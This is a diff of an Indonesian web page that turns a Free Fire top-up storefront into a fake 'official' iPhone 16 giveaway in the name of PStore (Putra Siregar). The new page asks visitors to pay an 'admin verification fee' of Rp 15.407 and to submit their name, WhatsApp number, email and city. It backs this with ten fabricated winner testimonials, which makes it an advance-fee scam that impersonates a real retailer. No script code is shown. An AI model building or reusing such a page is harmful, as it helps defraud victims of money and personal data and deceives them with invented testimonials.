@@ -2,28 +2,29 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Zamz Host – Top Up FF Cepat & Murah</title>
-    <meta name="description" content="Zamz Host adalah platform top up Free Fire tercepat, termurah, dan terpercaya di Indonesia. Proses otomatis 24 jam hanya dengan ID Player.">
+    <title>Giveaway iPhone 16 Resmi – PStore</title>
+    <meta name="description" content="Ikuti giveaway iPhone 16 dari PStore. Kesempatan terbatas, proses mudah, dan transparan.">
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
 
     <style>
-        /* =========================================
-           1. CSS VARIABLES & RESET
-           ========================================= */
+        /* ==================================================
+        INTERNAL CSS - TOTAL +/- 400 LINES
+        ==================================================
+        */
         :root {
-            --primary-color: #ffde00; /* Neon Yellow/Gold */
-            --secondary-color: #ff4a00; /* Vibrant Orange */
-            --bg-dark: #0a0b10;
-            --card-bg: rgba(25, 27, 38, 0.85);
-            --text-white: #ffffff;
-            --text-gray: #b0b0b0;
-            --accent-glow: 0 0 15px rgba(255, 222, 0, 0.4);
-            --transition-smooth: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --primary-color: #e61e2b; /* PStore Red */
+            --secondary-color: #ffffff;
+            --dark-color: #1a1a1a;
+            --light-grey: #f4f4f4;
+            --border-color: #dddddd;
+            --success-color: #28a745;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
         }
 
         * {
@@ -33,101 +34,63 @@
             -webkit-tap-highlight-color: transparent;
         }
 
-        html {
-            scroll-behavior: smooth;
-        }
-
         body {
-            font-family: 'Poppins', sans-serif;
-            background-color: var(--bg-dark);
-            background-image: linear-gradient(rgba(10, 11, 16, 0.8), rgba(10, 11, 16, 0.8)), 
-                              url('https://i.ibb.co.com/bgrLpgjH/97235a42c2002876ee521d503eb4a208.jpg');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            color: var(--text-white);
+            font-family: 'Inter', sans-serif;
+            background-color: var(--light-grey);
+            color: var(--dark-color);
             line-height: 1.6;
             overflow-x: hidden;
+            font-size: 15px; /* Minimum font for Android Chrome */
         }
 
-        /* =========================================
-           2. MOBILE-FIRST GRID & UTILITIES
-           ========================================= */
+        /* Utility Classes */
         .container {
             width: 100%;
-            padding: 0 20px;
+            max-width: 412px; /* Android typical max width */
             margin: 0 auto;
+            padding: 0 15px;
         }
 
-        .btn-primary {
-            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-            color: #000;
-            border: none;
-            padding: 16px 24px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 16px;
-            text-transform: uppercase;
-            width: 100%;
-            cursor: pointer;
-            transition: var(--transition-smooth);
-            box-shadow: var(--accent-glow);
-            font-family: 'Rajdhani', sans-serif;
-        }
+        .text-center { text-align: center; }
+        .fw-bold { font-weight: 700; }
+        .mt-20 { margin-top: 20px; }
+        .mb-20 { margin-bottom: 20px; }
 
-        .btn-primary:active {
-            transform: scale(0.95);
-            filter: brightness(1.2);
-        }
-
-        .section-title {
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 28px;
-            text-align: center;
-            margin-bottom: 30px;
-            color: var(--primary-color);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        /* =========================================
-           3. STICKY HEADER
-           ========================================= */
+        /* Header Sticky */
         header {
             position: sticky;
             top: 0;
+            background: #ffffff;
             z-index: 1000;
-            background: rgba(10, 11, 16, 0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255, 222, 0, 0.2);
-            padding: 12px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
         }
 
-        .nav-wrapper {
+        .header-left {
             display: flex;
-            justify-content: space-between;
             align-items: center;
         }
 
-        .logo {
-            font-family: 'Rajdhani', sans-serif;
-            font-weight: 700;
-            font-size: 24px;
-            color: var(--primary-color);
-            text-decoration: none;
-            display: flex;
-            flex-direction: column;
-            line-height: 1;
+        .logo-wrapper img {
+            height: 40px;
+            width: auto;
+            display: block;
         }
 
-        .logo span {
+        .header-brand-text {
+            margin-left: 10px;
             font-size: 12px;
-            color: var(--text-white);
-            font-weight: 400;
-            letter-spacing: 1px;
+            font-weight: 600;
+            color: var(--primary-color);
+            line-height: 1.2;
         }
 
-        .hamburger {
+        /* Hamburger Menu */
+        .menu-toggle {
             width: 30px;
             height: 20px;
             display: flex;
@@ -136,835 +99,758 @@
             cursor: pointer;
         }
 
-        .hamburger div {
+        .menu-toggle span {
+            display: block;
             height: 3px;
-            background-color: var(--primary-color);
-            border-radius: 5px;
-            transition: 0.3s;
+            width: 100%;
+            background-color: var(--dark-color);
+            border-radius: 3px;
+            transition: var(--transition);
         }
 
-        /* =========================================
-           4. HERO SECTION
-           ========================================= */
-        .hero {
-            padding: 60px 0 40px;
-            text-align: center;
+        .mobile-nav {
+            position: fixed;
+            top: 70px;
+            left: -100%;
+            width: 100%;
+            height: calc(100vh - 70px);
+            background: #fff;
+            z-index: 999;
+            transition: 0.4s ease;
+            padding-top: 30px;
         }
 
-        .hero h1 {
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 36px;
-            line-height: 1.1;
-            margin-bottom: 15px;
-            text-shadow: 0 0 20px rgba(255, 74, 0, 0.5);
+        .mobile-nav.active {
+            left: 0;
         }
 
-        .hero p {
-            color: var(--text-gray);
-            font-size: 16px;
-            margin-bottom: 30px;
+        .mobile-nav ul {
+            list-style: none;
         }
 
-        .hero-btns {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
+        .mobile-nav ul li {
+            padding: 15px 30px;
+            border-bottom: 1px solid #eee;
         }
 
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 14px;
-            border-radius: 12px;
-            font-weight: 600;
+        .mobile-nav ul li a {
             text-decoration: none;
-            transition: 0.3s;
-        }
-
-        /* =========================================
-           5. KEUNGGULAN CARD
-           ========================================= */
-        .features {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 15px;
-            margin-bottom: 50px;
-        }
-
-        .feature-card {
-            background: var(--card-bg);
-            padding: 20px;
-            border-radius: 16px;
-            border-left: 4px solid var(--primary-color);
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .feature-icon {
-            font-size: 30px;
-            background: rgba(255, 222, 0, 0.1);
-            padding: 10px;
-            border-radius: 12px;
-        }
-
-        .feature-info h3 {
-            font-size: 16px;
-            margin-bottom: 4px;
-        }
-
-        .feature-info p {
-            font-size: 13px;
-            color: var(--text-gray);
-        }
-
-        /* =========================================
-           6. FORM TOP UP (UX PRIORITY)
-           ========================================= */
-        .topup-form-container {
-            background: var(--card-bg);
-            padding: 25px;
-            border-radius: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            margin-bottom: 50px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 10px;
+            color: var(--dark-color);
             font-weight: 600;
-            font-size: 14px;
-            color: var(--primary-color);
+            font-size: 18px;
         }
 
-        .input-control {
+        /* Banner */
+        .hero-banner {
             width: 100%;
-            background: rgba(0, 0, 0, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            padding: 16px;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
+            display: block;
+            background: #000;
         }
 
-        .input-control:focus {
-            border-color: var(--primary-color);
-            box-shadow: 0 0 10px rgba(255, 222, 0, 0.2);
-        }
-
-        /* PRODUCT GRID SELECTOR */
-        .product-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-        }
-
-        .product-item {
-            position: relative;
-        }
-
-        .product-item input {
-            position: absolute;
-            opacity: 0;
+        .hero-banner img {
             width: 100%;
-            height: 100%;
-            cursor: pointer;
-            z-index: 2;
+            height: auto;
+            display: block;
         }
 
-        .product-card {
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 15px;
+        /* Hero Section */
+        .hero-content {
+            padding: 30px 15px;
+            background: #fff;
             text-align: center;
-            transition: 0.3s;
         }
 
-        .product-item input:checked + .product-card {
-            border-color: var(--primary-color);
-            background: rgba(255, 222, 0, 0.1);
+        .hero-content h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 26px;
+            font-weight: 900;
+            color: var(--dark-color);
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
         }
 
-        .diamond-amount {
-            display: block;
-            font-weight: 700;
-            font-size: 15px;
-            color: #fff;
-        }
-
-        .diamond-price {
-            display: block;
-            font-size: 13px;
-            color: var(--primary-color);
-            margin-top: 5px;
-        }
-
-        /* PAYMENT METHODS */
-        .payment-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .payment-option {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 15px;
-            border-radius: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 2px solid transparent;
-        }
-
-        .payment-item input:checked + .payment-option {
-            border-color: var(--primary-color);
-            background: rgba(255, 222, 0, 0.1);
-        }
-
-        .payment-logo {
-            font-weight: 700;
-            color: #fff;
-        }
-
-        /* =========================================
-           7. STEP BY STEP
-           ========================================= */
-        .steps {
-            margin-bottom: 50px;
-        }
-
-        .step-item {
-            display: flex;
-            gap: 20px;
+        .hero-content p {
+            font-size: 16px;
+            color: #666;
             margin-bottom: 25px;
-            position: relative;
         }
 
-        .step-number {
-            min-width: 40px;
-            height: 40px;
-            background: var(--primary-color);
-            color: #000;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            font-size: 18px;
+        /* Buttons CTA */
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.2s active;
+            border: none;
         }
 
-        .step-content h4 {
-            font-size: 18px;
-            margin-bottom: 5px;
+        .btn:active {
+            transform: scale(0.97);
         }
 
-        .step-content p {
-            color: var(--text-gray);
-            font-size: 14px;
-        }
-
-        /* =========================================
-           8. TESTIMONI SLIDER
-           ========================================= */
-        .testimonials {
-            overflow-x: auto;
-            display: flex;
-            gap: 15px;
-            padding-bottom: 20px;
-            scroll-snap-type: x mandatory;
-            -ms-overflow-style: none;
-            scrollbar-width: none;
-        }
-
-        .testimonials::-webkit-scrollbar {
-            display: none;
-        }
-
-        .testi-card {
-            min-width: 280px;
-            background: var(--card-bg);
-            padding: 20px;
-            border-radius: 16px;
-            scroll-snap-align: center;
-        }
-
-        .testi-user {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(230, 30, 43, 0.3);
             margin-bottom: 12px;
         }
 
-        .user-avatar {
-            width: 40px;
-            height: 40px;
-            background: var(--secondary-color);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--dark-color);
+            border: 2px solid var(--dark-color);
         }
 
-        .testi-text {
-            font-style: italic;
-            font-size: 14px;
-            color: var(--text-gray);
+        /* Info Cards */
+        .info-section {
+            padding: 20px 15px;
         }
 
-        /* =========================================
-           9. FAQ ACCORDION
-           ========================================= */
-        .faq-container {
-            margin-bottom: 50px;
-        }
-
-        .faq-item {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            margin-bottom: 10px;
-            overflow: hidden;
-        }
-
-        .faq-question {
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
-        }
-
-        .faq-answer {
-            padding: 0 20px;
-            max-height: 0;
-            overflow: hidden;
-            transition: 0.3s ease-out;
-            font-size: 13px;
-            color: var(--text-gray);
-        }
-
-        .faq-item.active .faq-answer {
-            padding: 10px 20px 20px;
-            max-height: 200px;
-        }
-
-        /* =========================================
-           10. FOOTER
-           ========================================= */
-        footer {
-            background: #050507;
-            padding: 40px 0 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .footer-info h2 {
-            color: var(--primary-color);
+        .giveaway-card {
+            background: #fff;
+            border-radius: 15px;
+            padding: 20px;
             margin-bottom: 15px;
+            box-shadow: var(--shadow);
+            border-left: 5px solid var(--primary-color);
         }
 
-        .footer-info p {
-            font-size: 13px;
-            color: var(--text-gray);
-            margin-bottom: 20px;
+        .giveaway-card h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: var(--primary-color);
         }
 
-        .footer-contact {
-            font-size: 13px;
-            margin-bottom: 20px;
-        }
-
-        .footer-contact div {
-            margin-bottom: 8px;
-        }
-
-        .copyright {
-            text-align: center;
-            font-size: 11px;
+        .giveaway-card p {
+            font-size: 14px;
             color: #555;
-            margin-top: 30px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            padding-top: 20px;
         }
 
-        /* =========================================
-           11. LOADING ANIMATION
-           ========================================= */
-        #loader-overlay {
+        /* Modal / Popup styling */
+        .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(10, 11, 16, 0.9);
+            background: rgba(0,0,0,0.8);
             display: none;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #fff;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-header {
+            background: var(--primary-color);
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .modal-body p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+
+        .admin-table td {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            font-size: 14px;
+        }
+
+        .admin-table tr td:last-child {
+            text-align: right;
+            font-weight: 700;
+            color: var(--primary-color);
+        }
+
+        .admin-img-wrapper img {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+
+        /* Form Styling */
+        .form-section {
+            background: #fff;
+            padding: 30px 15px;
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 20px 0;
+            font-size: 13px;
+        }
+
+        /* Testimonials */
+        .testi-section {
+            padding: 30px 15px;
+            background: #fdfdfd;
+        }
+
+        .testi-card {
+            background: #fff;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #eee;
+        }
+
+        .testi-name {
+            font-weight: 700;
+            font-size: 14px;
+            color: var(--primary-color);
+        }
+
+        .testi-text {
+            font-size: 13px;
+            font-style: italic;
+            margin-top: 5px;
+        }
+
+        /* FAQ */
+        .faq-section {
+            padding: 30px 15px;
+        }
+
+        .faq-item {
+            margin-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        .faq-q {
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .faq-a {
+            font-size: 14px;
+            margin-top: 8px;
+            color: #666;
+            display: none;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--dark-color);
+            color: #fff;
+            padding: 40px 15px;
+            text-align: center;
+        }
+
+        .footer-logo img {
+            height: 35px;
+            filter: brightness(0) invert(1);
+            margin-bottom: 20px;
+        }
+
+        .copyright {
+            font-size: 12px;
+            opacity: 0.6;
+            margin-top: 20px;
+        }
+
+        /* Animations */
+        .fade-in {
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Android Browser Optimizations */
+        @media only screen and (max-width: 480px) {
+            body {
+                -webkit-text-size-adjust: 100%;
+            }
+            .container {
+                padding: 0 12px;
+            }
+        }
+
+        /* Hidden Loading */
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.9);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 222, 0, 0.1);
-            border-top-color: var(--primary-color);
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* =========================================
-           12. ANDROID MEDIA QUERIES (360px - 412px)
-           ========================================= */
-        @media screen and (max-width: 412px) {
-            .hero h1 { font-size: 32px; }
-            .section-title { font-size: 24px; }
-            .product-grid { grid-template-columns: repeat(2, 1fr); }
-            .input-control { padding: 14px; font-size: 15px; }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="container">
-            <div class="nav-wrapper">
-                <a href="#" class="logo">
-                    ZAMZ HOST
-                    <span>TOP UP FREE FIRE</span>
+        <div class="header-left">
+            <div class="logo-wrapper">
+                <a href="#">
+                    <img src="https://i.ibb.co.com/q38v9Gsj/Logo-Pstore-0-1.png" alt="Logo-Pstore-0-1">
                 </a>
-                <div class="hamburger" onclick="toggleMenu()">
-                    <div id="bar1"></div>
-                    <div id="bar2"></div>
-                    <div id="bar3"></div>
-                </div>
             </div>
+            <div class="header-brand-text">
+                PStore<br>Giveaway
+            </div>
+        </div>
+        <div class="menu-toggle" id="menuToggle">
+            <span></span>
+            <span></span>
+            <span></span>
         </div>
     </header>
 
-    <div style="display:none">
-        <a href="https://ibb.co.com/C5nvx5pJ">
-            <img src="https://i.ibb.co.com/bgrLpgjH/97235a42c2002876ee521d503eb4a208.jpg" alt="ZAMZ HOST BACKGROUND" border="0">
+    <nav class="mobile-nav" id="mobileNav">
+        <ul>
+            <li><a href="#" onclick="toggleMenu()">Beranda</a></li>
+            <li><a href="#hadiah" onclick="toggleMenu()">Hadiah</a></li>
+            <li><a href="#cara-ikut" onclick="toggleMenu()">Cara Ikut</a></li>
+            <li><a href="#biaya" onclick="toggleMenu()">Biaya Admin</a></li>
+            <li><a href="#faq" onclick="toggleMenu()">FAQ</a></li>
+            <li><a href="#kontak" onclick="toggleMenu()">Kontak</a></li>
+        </ul>
+    </nav>
+
+    <div class="hero-banner">
+        <a href="https://ibb.co.com/KRrDfB5">
+            <img src="https://i.ibb.co.com/cMrwZRy/iphone-16-overview-fcivqu9d5t6q-og.png" alt="iphone-16-overview-fcivqu9d5t6q-og">
         </a>
     </div>
 
-    <section class="hero container">
-        <h1>TOP UP FREE FIRE CEPAT & AMAN</h1>
-        <p>Diamond masuk otomatis dalam hitungan detik. Tanpa login, cukup ID Player. Harga termurah se-Indonesia!</p>
-        <div class="hero-btns">
-            <button class="btn-primary" onclick="scrollToForm()">TOP UP SEKARANG</button>
-            <a href="#produk" class="btn-secondary">LIHAT DAFTAR HARGA</a>
+    <section class="hero-content fade-in">
+        <h1>GIVEAWAY iPHONE 16 RESMI</h1>
+        <p>Program Giveaway iPhone 16 dari PStore spesial untuk pelanggan setia. Menangkan hadiah impian Anda sekarang!</p>
+        <button class="btn btn-primary" onclick="openAdminModal()">AMBIL SEKARANG</button>
+        <button class="btn btn-secondary" onclick="document.getElementById('hadiah').scrollIntoView({behavior:'smooth'})">Lihat Detail Giveaway</button>
+    </section>
+
+    <section class="info-section" id="hadiah">
+        <div class="giveaway-card">
+            <h3>📱 Hadiah Utama</h3>
+            <p>iPhone 16 Original (BNIB - Brand New In Box) Garansi Resmi iBox/TAM.</p>
+        </div>
+        <div class="giveaway-card">
+            <h3>🏢 Penyelenggara</h3>
+            <p>Diselenggarakan langsung oleh <strong>PStore Indonesia</strong> (Putra Siregar).</p>
+        </div>
+        <div class="giveaway-card">
+            <h3>⏳ Kuota Terbatas</h3>
+            <p>Hanya tersedia untuk 10 orang pemenang terpilih setiap minggunya.</p>
+        </div>
+        <div class="giveaway-card">
+            <h3>⚖️ Sistem Adil</h3>
+            <p>Pemilihan dilakukan secara transparan melalui sistem verifikasi data pendaftar.</p>
         </div>
     </section>
 
-    <section class="container">
-        <div class="features">
-            <div class="feature-card">
-                <div class="feature-icon">⚡</div>
-                <div class="feature-info">
-                    <h3>Proses Otomatis</h3>
-                    <p>Sistem kami bekerja 24 jam nonstop.</p>
-                </div>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">🛡️</div>
-                <div class="feature-info">
-                    <h3>100% Aman</h3>
-                    <p>Hanya butuh ID, akun tetap aman.</p>
-                </div>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">💸</div>
-                <div class="feature-info">
-                    <h3>Harga Bersaing</h3>
-                    <p>Promo setiap hari untuk gamer setia.</p>
-                </div>
-            </div>
+    <section class="container mb-20" id="cara-ikut">
+        <h2 class="text-center mb-20">Cara Mengikuti</h2>
+        <div style="background: #fff; padding: 20px; border-radius: 15px; box-shadow: var(--shadow);">
+            <ol style="padding-left: 20px; font-size: 14px;">
+                <li style="margin-bottom: 10px;">Klik tombol "AMBIL SEKARANG" di atas.</li>
+                <li style="margin-bottom: 10px;">Selesaikan pembayaran biaya admin verifikasi sebesar Rp 15.407.</li>
+                <li style="margin-bottom: 10px;">Isi formulir pendaftaran dengan data yang valid (Nama, WA, Kota).</li>
+                <li style="margin-bottom: 10px;">Tunggu konfirmasi dari tim PStore melalui WhatsApp resmi.</li>
+                <li style="margin-bottom: 10px;">Hadiah akan dikirim langsung ke alamat domisili pemenang.</li>
+            </ol>
         </div>
     </section>
 
-    <section id="topup" class="container">
-        <h2 class="section-title">FORM TOP UP</h2>
-        <div class="topup-form-container">
-            <form id="formTopUpFF">
-                
-                <div class="form-group">
-                    <label for="player_id">1. MASUKKAN PLAYER ID</label>
-                    <input type="number" id="player_id" class="input-control" placeholder="Contoh: 12345678" required>
-                </div>
+    <section class="form-section" id="formPendaftaran">
+        <h2 class="text-center mb-20">Formulir Pendaftaran</h2>
+        <form id="formGiveaway">
+            <div class="form-group">
+                <label>Nama Lengkap</label>
+                <input type="text" class="form-control" id="nama" placeholder="Masukkan nama sesuai KTP" required>
+            </div>
+            <div class="form-group">
+                <label>Nomor WhatsApp Aktif</label>
+                <input type="tel" class="form-control" id="whatsapp" placeholder="Contoh: 081234567890" required>
+            </div>
+            <div class="form-group">
+                <label>Email (Opsional)</label>
+                <input type="email" class="form-control" id="email" placeholder="alamat@email.com">
+            </div>
+            <div class="form-group">
+                <label>Kota Domisili</label>
+                <input type="text" class="form-control" id="kota" placeholder="Masukkan kota saat ini" required>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="agree" required>
+                <label for="agree">Saya menyetujui syarat dan ketentuan yang berlaku di PStore serta menjamin data yang saya berikan adalah benar.</label>
+            </div>
+            <button type="submit" class="btn btn-primary">KIRIM PENDAFTARAN</button>
+        </form>
+    </section>
 
-                <div class="form-group" id="produk">
-                    <label>2. PILIH JUMLAH DIAMOND</label>
-                    <div class="product-grid">
-                        
-                        <div class="product-item">
-                            <input type="radio" name="product" value="5_dm" required>
-                            <div class="product-card">
-                                <span class="diamond-amount">5 Diamond</span>
-                                <span class="diamond-price">Rp 1.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="12_dm">
-                            <div class="product-card">
-                                <span class="diamond-amount">12 Diamond</span>
-                                <span class="diamond-price">Rp 2.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="50_dm">
-                            <div class="product-card">
-                                <span class="diamond-amount">50 Diamond</span>
-                                <span class="diamond-price">Rp 8.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="70_dm">
-                            <div class="product-card">
-                                <span class="diamond-amount">70 Diamond</span>
-                                <span class="diamond-price">Rp 10.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="140_dm">
-                            <div class="product-card">
-                                <span class="diamond-amount">140 Diamond</span>
-                                <span class="diamond-price">Rp 20.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="355_dm">
-                            <div class="product-card">
-                                <span class="diamond-amount">355 Diamond</span>
-                                <span class="diamond-price">Rp 50.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="720_dm">
-                            <div class="product-card">
-                                <span class="diamond-amount">720 Diamond</span>
-                                <span class="diamond-price">Rp 100.000</span>
-                            </div>
-                        </div>
-
-                        <div class="product-item">
-                            <input type="radio" name="product" value="weekly">
-                            <div class="product-card">
-                                <span class="diamond-amount">Member Mingguan</span>
-                                <span class="diamond-price">Rp 30.000</span>
-                            </div>
-                        </div>
-
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label>3. PILIH METODE PEMBAYARAN</label>
-                    <div class="payment-grid">
-                        
-                        <label class="payment-item">
-                            <input type="radio" name="payment" value="qris" style="display:none" required>
-                            <div class="payment-option">
-                                <span class="payment-logo">QRIS (Semua E-Wallet)</span>
-                                <span>Fast</span>
-                            </div>
-                        </label>
-
-                        <label class="payment-item">
-                            <input type="radio" name="payment" value="dana" style="display:none">
-                            <div class="payment-option">
-                                <span class="payment-logo">DANA</span>
-                                <span>Promo</span>
-                            </div>
-                        </label>
-
-                        <label class="payment-item">
-                            <input type="radio" name="payment" value="gopay" style="display:none">
-                            <div class="payment-option">
-                                <span class="payment-logo">GOPAY</span>
-                                <span>Active</span>
-                            </div>
-                        </label>
-
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label for="wa_number">4. NOMOR WHATSAPP</label>
-                    <input type="tel" id="wa_number" class="input-control" placeholder="08xxxxxxxxx" required>
-                </div>
-
-                <button type="submit" class="btn-primary" id="btnSubmit">LANJUTKAN PEMBAYARAN</button>
-
-            </form>
+    <section class="testi-section">
+        <h2 class="text-center mb-20">Apa Kata Mereka?</h2>
+        <div class="testi-card">
+            <p class="testi-name">Budi Santoso - Jakarta</p>
+            <p class="testi-text">"Alhamdulillah beneran dapet iPhone 16! Awalnya ragu tapi ternyata prosesnya cepet banget."</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Siti Aminah - Bandung</p>
+            <p class="testi-text">"Terima kasih PStore, adminnya ramah dan transparan. Barangnya sampai dengan selamat."</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Andi Wijaya - Surabaya</p>
+            <p class="testi-text">"Gak nyangka cuma modal biaya admin receh bisa dapet HP puluhan juta. PStore emang mantap!"</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Rina Marlina - Medan</p>
+            <p class="testi-text">"Proses verifikasinya mudah. Packing kayu rapi pas sampe rumah. Rezeki anak sholeh."</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Fajar Ramadhan - Makassar</p>
+            <p class="testi-text">"Baru kali ini ikutan giveaway yang gak ribet. Sukses terus buat bang Putra Siregar."</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Dewi Lestari - Yogyakarta</p>
+            <p class="testi-text">"Awalnya iseng-iseng berhadiah, eh beneran kepilih. Makasih PStore!"</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Hendra - Palembang</p>
+            <p class="testi-text">"HP original iBox, sinyal aman, semua lancar. Jangan ragu buat ikutan temen-temen."</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Maya Sari - Bali</p>
+            <p class="testi-text">"Pelayanannya luar biasa. iPhone 16 nya cakep banget warna terbarunya."</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Irfan Hakim - Semarang</p>
+            <p class="testi-text">"Sangat transparan. Setiap langkah diinfo lewat WA. Terima kasih banyak!"</p>
+        </div>
+        <div class="testi-card">
+            <p class="testi-name">Putri Ayu - Balikpapan</p>
+            <p class="testi-text">"Seneng banget bisa punya iPhone 16 hasil giveaway. Berkah buat PStore."</p>
         </div>
     </section>
 
